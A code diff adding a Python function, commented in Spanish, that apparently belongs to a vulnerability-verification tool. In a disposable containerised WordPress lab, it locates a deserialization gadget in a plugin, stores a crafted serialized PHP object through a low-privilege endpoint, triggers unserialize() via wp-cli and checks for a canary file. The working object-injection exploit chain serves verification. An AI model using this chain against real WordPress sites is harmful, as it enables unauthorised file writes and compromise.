@@ -2666,3 +2666,165 @@ def verify_wordpress_deserialization(
     finally:
         step("desmontando el laboratorio (contenedores/red/volumen)...")
         lab.teardown()
+
+
+def verify_wordpress_deserialization_custom_table(
+    plugin_source_dir: str, slug: str, store_endpoint: str, store_http_method: str,
+    store_parameters, table_name: str, column_name: str, id_column: str = "id",
+    serial_param_hint: str = "",
+    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
+) -> WpVerifyResult:
+    """Variante EN DOS PASOS de verify_wordpress_deserialization, apuntando al mecanismo REAL de
+    object injection almacenado en WordPress -- NO la API de Options/Transients (ver
+    verify_wordpress_deserialization_stored, que se probo en vivo y se retiro: maybe_serialize()
+    vuelve a serializar un string que ya parece serializado desde WP 3.6.1/2013, asi que ese
+    camino esta cerrado desde hace mas de una decada), sino una TABLA PROPIA del plugin escrita
+    con SQL crudo via $wpdb->insert()/update() -- eso NO pasa por maybe_serialize() en absoluto,
+    asi que el string del atacante sobrevive intacto en la columna hasta que algo la lea con
+    unserialize().
+
+    Dos pasos, cada uno una accion real:
+      1) PASO 1: se envia el objeto PHP serializado de verdad (mismo gadget que
+         verify_wordpress_deserialization encuentra con find_file_write_gadget) al endpoint que
+         lo guarda en la tabla propia, como atacante de bajo privilegio.
+      2) PASO 2: se fuerza la lectura+unserialize() REAL via wp-cli (`wp eval`) -- se lee la fila
+         mas reciente de `table_name`/`column_name` (ORDER BY `id_column` DESC LIMIT 1, la
+         convencion casi universal de clave primaria autoincremental) y se llama a unserialize()
+         sobre ella en el MISMO proceso PHP que ya tiene cargados todos los plugins activos (el
+         bootstrap completo de WordPress, igual que cualquier visita real a una pagina que haga
+         esa misma lectura) -- no es una simulacion, es la funcion real ejecutandose.
+
+    `verified` SOLO pasa a True si el fichero canario aparece con el secreto exacto DESPUES del
+    paso 2."""
+    step = on_step or (lambda _m: None)
+    pre = _check_prereqs(plugin_source_dir, slug)
+    if pre is not None:
+        return pre
+    res = WpVerifyResult()
+    t0 = time.time()
+
+    from .deserialize_gadgets import find_file_write_gadget, build_php_serialized_object
+    plugin_root = os.path.join(plugin_source_dir, slug)
+    step("escaneando el codigo real en busca de un gadget de deserializacion...")
+    gadget = find_file_write_gadget(plugin_root)
+    if gadget is None:
+        res.detail = ("no se encontro ningun gadget de deserializacion en el codigo del plugin "
+                      "(una clase con __wakeup()/__destruct() que escriba una propiedad publica "
+                      "a una ruta publica via file_put_contents())")
+        res.limitations.append("la verificacion de deserializacion por tabla propia tambien "
+                               "necesita un gadget real en el propio codigo; si no hay ninguno, "
+                               "no hay nada que verificar sin inventarse una cadena de terceros")
+        return res
+    step(f"gadget encontrado: clase '{gadget.full_class_name}' en {gadget.file}:{gadget.line} "
+         f"({gadget.magic_method} -> file_put_contents($this->{gadget.path_prop}, "
+         f"$this->{gadget.content_prop}))")
+
+    if not table_name or not column_name:
+        res.detail = "no se dio la tabla/columna propia donde se almacena el valor"
+        res.limitations.append("la verificacion de deserializacion por tabla propia necesita "
+                               "saber en que tabla y columna guarda el valor el plugin (p.ej. "
+                               "tabla 'wp_myplugin_tokens', columna 'token_data') -- miralo en "
+                               "el $wpdb->insert()/update() real del codigo y pasalo a mano "
+                               "(table_name/column_name)")
+        return res
+
+    serial_param = serial_param_hint or _pick_param(store_parameters, _SERIAL_HINTS)
+
+    lab = _Lab(_token())
+    try:
+        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
+        if boot is None:
+            return res
+
+        secret = secrets.token_hex(16)
+        # igual que en la variante de options (ver el commit que la retiro): el PASO 2 lo
+        # ejecuta un contenedor wp-cli EFIMERO Y SEPARADO (--rm), asi que la ruta canario tiene
+        # que vivir en el VOLUMEN COMPARTIDO para sobrevivir y ser visible desde el contenedor
+        # Apache despues -- confirmado en vivo que /tmp del contenedor wp-cli se pierde al
+        # terminar.
+        canary_path = f"/var/www/html/binoracle_canary_{_token()}.txt"
+        payload_obj = build_php_serialized_object(gadget, canary_path, secret)
+        m = (store_http_method or "POST").upper()
+        res.evidence.update({
+            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
+            "gadget_clase": gadget.full_class_name, "gadget_metodo": gadget.magic_method,
+            "gadget_ubicacion": f"{gadget.file}:{gadget.line}", "canary_path": canary_path,
+            "canary_secret": secret, "objeto_serializado": payload_obj,
+            "tabla": table_name, "columna": column_name, "columna_id": id_column,
+            "serial_param": serial_param or "(cuerpo crudo)", "metodo": m,
+            "store_endpoint": store_endpoint,
+        })
+
+        step(f"PASO 1/2 -- almacenando el objeto serializado via {m} {store_endpoint} (sesion "
+             f"de '{boot.sub_user}', bajo privilegio)...")
+        payload = dict(store_parameters) if isinstance(store_parameters, dict) else {p: "" for p in (store_parameters or [])}
+        tried_store = []
+        stored_ok = False
+
+        def try_store(label, **kwargs):
+            nonlocal stored_ok
+            try:
+                r = boot.sub_sess.request(m, boot.base_url + store_endpoint, timeout=20, **kwargs)
+                tried_store.append({"modo": label, "status": r.status_code})
+                stored_ok = True
+            except Exception as e:
+                tried_store.append({"modo": label, "error": str(e)})
+
+        if serial_param:
+            p1 = dict(payload)
+            p1[serial_param] = payload_obj
+            try_store("parametro de formulario",
+                     data=p1 if m != "GET" else None, params=p1 if m == "GET" else None)
+        if not stored_ok:
+            try_store("cuerpo crudo", data=payload_obj.encode())
+        res.evidence["intentos_paso1"] = tried_store
+        if not stored_ok:
+            res.detail = "el PASO 1 (almacenar) fallo en todas las formas probadas"
+            return res
+
+        step(f"PASO 2/2 -- forzando la lectura+unserialize() REAL via wp-cli (SELECT "
+             f"{column_name} FROM {table_name} ORDER BY {id_column} DESC LIMIT 1)...")
+        php_snippet = (
+            f"global $wpdb; "
+            f"$row = $wpdb->get_var(\"SELECT {column_name} FROM {table_name} "
+            f"ORDER BY {id_column} DESC LIMIT 1\"); "
+            f"if ($row) {{ unserialize($row); }} else {{ echo 'BINORACLE_NO_ROW'; }}"
+        )
+        r2 = lab.wp_cli("eval", php_snippet, timeout=30)
+        res.evidence["wp_cli_salida"] = ((r2.stdout or "") + (r2.stderr or ""))[:500]
+        if "BINORACLE_NO_ROW" in (r2.stdout or ""):
+            res.detail = (f"el PASO 1 no dejo ninguna fila en {table_name}.{column_name} -- la "
+                          f"tabla/columna no son las reales, o el endpoint no escribio ahi")
+            return res
+
+        time.sleep(1)
+        rcheck = lab.sh("exec", lab.wp, "sh", "-c", f"cat {canary_path} 2>/dev/null", timeout=10)
+        content = rcheck.stdout or ""
+        present = secret in content
+        res.evidence["secreto_presente"] = present
+        if present:
+            res.verified = True
+            res.ok = True
+            res.detail = (f"DESERIALIZATION confirmada (tabla propia, en dos pasos): el objeto "
+                          f"serializado guardado en el PASO 1 en {table_name}.{column_name} se "
+                          f"reconstruyo de verdad al leerlo+unserialize() en el PASO 2 -- su "
+                          f"{gadget.magic_method} escribio el secreto exacto en {canary_path}")
+            step(f"VERIFICADO: {canary_path} contiene el secreto -- deserializacion por tabla "
+                 f"propia confirmada.")
+        else:
+            res.ok = True
+            res.detail = (f"se almaceno el payload en el paso 1 y se forzo la lectura+"
+                          f"unserialize() en el paso 2, pero el fichero canario no aparecio -- "
+                          f"no se confirmo (puede que la tabla/columna no sean las reales, que "
+                          f"el valor se guarde escapado/modificado antes del INSERT, o que la "
+                          f"columna tenga un tipo que trunque el valor)")
+        return res
+    except subprocess.TimeoutExpired as e:
+        res.detail = f"timeout de infraestructura: {e}"
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio (contenedores/red/volumen)...")
+        lab.teardown()
